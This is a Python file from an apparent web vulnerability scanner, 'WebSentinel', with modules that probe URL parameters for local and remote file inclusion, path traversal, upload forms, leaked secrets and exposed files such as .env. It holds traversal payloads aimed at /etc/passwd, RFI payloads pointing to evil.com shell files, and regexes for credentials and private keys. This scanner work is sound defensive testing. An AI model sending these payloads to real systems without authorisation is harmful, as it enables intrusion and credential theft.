"""
WebSentinel Framework - File & Path Modules
LFI, RFI, Path Traversal, File Upload, Information Disclosure,
Sensitive Data Exposure, Sensitive File enumeration.
"""

import re
from typing import List
from .base_module import BaseModule
from core.scorer import Finding
from core.crawler import Endpoint
from utils.helpers import inject_param
import config


class LFIModule(BaseModule):
    MODULE_NAME = "LFI"

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._should_inject() or not endpoint.params:
            return []

        file_params = [p for p in endpoint.params if any(
            k in p.lower() for k in ["file", "path", "page", "include", "doc",
                                      "template", "view", "content", "load"]
        )]
        if not file_params:
            return []

        for param in file_params:
            for payload in config.LFI_PAYLOADS:
                test_url = inject_param(endpoint.url, param, payload)
                result = self.engine.get(test_url)
                if not result.ok:
                    continue
                patterns = self.analyzer.detect_lfi_patterns(result.body)
                if patterns:
                    self._add_finding(
                        vuln_type="LFI",
                        severity="critical",
                        title=f"Local File Inclusion (LFI) in parameter '{param}'",
                        url=endpoint.url,
                        description=(
                            f"LFI vulnerability allows reading local files via '{param}'. "
                            f"Payload: {payload}"
                        ),
                        evidence=f"File content indicators: {', '.join(patterns)}",
                        parameter=param,
                        confidence=90,
                        cwe="CWE-22",
                        cvss=9.1,
                        exploitability="Probable",
                    )
                    break
        return self.findings


class PathTraversalModule(BaseModule):
    MODULE_NAME = "PathTraversal"

    TRAVERSAL_PAYLOADS = [
        "../../etc/passwd",
        "..%2F..%2Fetc%2Fpasswd",
        "....//....//etc/passwd",
        "%2e%2e/%2e%2e/etc/passwd",
        "../../windows/win.ini",
    ]
    TRAVERSAL_INDICATORS = ["root:x:", "[extensions]", "daemon:", "bin/bash", "for 16-bit"]

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._should_inject() or not endpoint.params:
            return []

        for param in endpoint.params:
            for payload in self.TRAVERSAL_PAYLOADS:
                test_url = inject_param(endpoint.url, param, payload)
                result = self.engine.get(test_url)
                if not result.ok:
                    continue
                body_lower = result.body.lower()
                if any(ind.lower() in body_lower for ind in self.TRAVERSAL_INDICATORS):
                    self._add_finding(
                        vuln_type="PathTraversal",
                        severity="critical",
                        title=f"Path Traversal in parameter '{param}'",
                        url=endpoint.url,
                        description=f"Path traversal allows reading files outside web root. Payload: {payload}",
                        evidence="File system content detected in response",
                        parameter=param,
                        confidence=88,
                        cwe="CWE-22",
                        cvss=8.6,
                        exploitability="Probable",
                    )
                    break
        return self.findings


class RFIModule(BaseModule):
    MODULE_NAME = "RFI"

    RFI_PAYLOADS = [
        "http://evil.com/shell.txt",
        "https://evil.com/shell.php",
        "//evil.com/test",
    ]
    RFI_ERROR_PATTERNS = ["failed to open stream", "include_once", "require_once"]

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._should_inject() or not endpoint.params:
            return []

        file_params = [p for p in endpoint.params if any(
            k in p.lower() for k in ["file", "include", "require", "load", "page"]
        )]
        if not file_params:
            return []

        for param in file_params:
            for payload in self.RFI_PAYLOADS:
                test_url = inject_param(endpoint.url, param, payload)
                result = self.engine.get(test_url)
                if not result.ok:
                    continue
                body_lower = result.body.lower()
                if any(p in body_lower for p in self.RFI_ERROR_PATTERNS):
                    self._add_finding(
                        vuln_type="RFI",
                        severity="critical",
                        title=f"Remote File Inclusion (RFI) in parameter '{param}'",
                        url=endpoint.url,
                        description=f"RFI vulnerability can execute remote code. Parameter: '{param}'",
                        parameter=param,
                        confidence=75,
                        cwe="CWE-98",
                        cvss=9.8,
                        exploitability="Probable",
                    )
                    break
        return self.findings


class FileUploadModule(BaseModule):
    MODULE_NAME = "FileUpload"

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._active_probing():
            return []

        for form in endpoint.forms:
            file_fields = [f for f in form.get("fields", []) if f.get("type") == "file"]
            if not file_fields:
                continue

            # Just flag the presence — don't actually upload
            self._add_finding(
                vuln_type="FileUpload",
                severity="medium",
                title=f"File Upload Endpoint Detected",
                url=form["action"],
                description=(
                    "A file upload form was detected. File upload endpoints require "
                    "strict validation of file type, content, and execution permissions. "
                    "Manual testing is recommended to verify upload restrictions."
                ),
                evidence=f"Form action: {form['action']}, File fields: {', '.join(f['name'] for f in file_fields)}",
                confidence=95,
                cwe="CWE-434",
                cvss=6.5,
                exploitability="Passive",
            )
        return self.findings


class InfoDisclosureModule(BaseModule):
    MODULE_NAME = "InfoDisclosure"

    SENSITIVE_PATTERNS = [
        (r"password\s*=\s*['\"]?\S+", "Password in response", "critical"),
        (r"api[_-]?key\s*[:=]\s*['\"]?\S+", "API key in response", "high"),
        (r"secret\s*[:=]\s*['\"]?\S+", "Secret in response", "high"),
        (r"token\s*[:=]\s*['\"]?[a-zA-Z0-9+/]{20,}", "Token in response", "high"),
        (r"BEGIN\s+(RSA|EC|PGP|DSA)\s+PRIVATE", "Private key in response", "critical"),
        (r"mysql://|postgresql://|mongodb://", "Database connection string", "high"),
        (r"[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}", "Email address disclosure", "low"),
        (r"\b(?:\d{1,3}\.){3}\d{1,3}\b", "Internal IP address disclosure", "low"),
        (r"Exception|Traceback|StackTrace|NullPointer|Error at line", "Stack trace disclosure", "medium"),
        (r"phpinfo\(\)|php_info", "PHP info disclosure", "medium"),
        (r"DB_PASSWORD|DB_USER|DB_HOST", "Database credentials in source", "high"),
    ]

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._active_probing():
            return []

        result = self.engine.get(endpoint.url)
        if not result.ok:
            return []

        server_info = self.analyzer.detect_server_info(result.headers)
        if server_info:
            self._add_finding(
                vuln_type="InfoDisclosure",
                severity="low",
                title="Server Version Information Disclosed",
                url=endpoint.url,
                description="HTTP headers reveal server software versions.",
                evidence=str(server_info),
                confidence=95,
                cwe="CWE-200",
                cvss=3.1,
                exploitability="Passive",
            )

        for pattern, label, severity in self.SENSITIVE_PATTERNS:
            matches = re.findall(pattern, result.body, re.IGNORECASE)
            if matches:
                self._add_finding(
                    vuln_type="InfoDisclosure",
                    severity=severity,
                    title=f"Sensitive Data Exposure: {label}",
                    url=endpoint.url,
                    description=f"{label} found in HTTP response body.",
                    evidence=str(matches[0])[:100],
                    confidence=80,
                    cwe="CWE-200",
                    cvss={"critical": 9.0, "high": 7.5, "medium": 5.3, "low": 3.1}.get(severity, 5.0),
                    exploitability="Passive",
                )

        return self.findings


class SensitiveFileModule(BaseModule):
    MODULE_NAME = "SensitiveFiles"

    def run(self, endpoint: Endpoint) -> List[Finding]:
        if not self._active_probing():
            return []

        from urllib.parse import urlparse
        parsed = urlparse(endpoint.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in config.SENSITIVE_FILES:
            test_url = base + path
            result = self.engine.head(test_url)
            if not result.ok:
                continue
            if result.status_code == 200:
                # Confirm with GET
                get_result = self.engine.get(test_url)
                if get_result.ok and get_result.content_length > 20:
                    severity = "critical" if path in ("/.env", "/.git/config", "/wp-config.php") else "high"
                    self._add_finding(
                        vuln_type="InfoDisclosure",
                        severity=severity,
                        title=f"Sensitive File Exposed: {path}",
                        url=test_url,
                        description=f"Sensitive file accessible at {path}",
                        evidence=f"HTTP 200, {get_result.content_length} bytes",
                        confidence=95,
                        cwe="CWE-538",
                        cvss={"critical": 9.1, "high": 7.5}.get(severity, 5.3),
                        exploitability="Passive",
                    )
        return self.findings
